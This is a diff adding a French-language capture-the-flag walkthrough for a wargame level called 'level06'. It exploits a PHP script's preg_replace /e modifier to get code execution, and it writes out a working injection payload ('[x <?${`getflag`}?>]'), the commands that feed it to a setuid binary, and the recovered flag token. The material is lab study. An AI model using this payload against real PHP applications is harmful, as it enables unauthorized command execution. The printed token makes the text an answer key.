@@ -1,0 +1,45 @@
+Strings level06
+/usr/bin/php -> /etc/alternatives/php -> /usr/bin/php5
+On utilise php5
+
+#!/usr/bin/php
+<?php
+function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+$r = x($argv[1], $argv[2]); print $r;
+?>
+
+preg_replace exploit:
+« /e » will cause PHP to execute the result of the preg_replace()
+Deprecated in PHP 5.5, on utilise php5, la faille est présente. 
+
+$string = "phpinfo()";
+print preg_replace('/^(.*)/e', 'strtoupper(\\1)', $string);
+	will print phpinfo()
+Try with <?${`getflag`}?>
+	fail. 
+Pour fonctionner, la source doit correspondre au 1er filtre : 
+\[x (.*)\]
+Donc [x cequejeveux]
+Pour print 
+
+
+preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a)
+Filtre : "/(\[x (.*)\])/e"
+Replace: "y(\"\\2\")"
+Arg: $a
+	[x <?${`getflag`}?>]
+	`getflag`
+	shell_exec("echo toto > /opt/openarenaserver/success );
+	cat /opt/openarenaserver/success
+
+php level06.php /tmp/l06 "<?${system(\`getflag\`)}?>"
+bash: <?${system(\`getflag\`)}?>: bad substitution
+On laisse tombé le 2nd argument
+
+With echo [x <?${`getflag`}?>] > /tmp/suc
+php level06.php /tmp/suc
+	no flag but get flag is call
+ on essaie avec le binaire ./level06
+./level06 /tmp/suc
+	Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
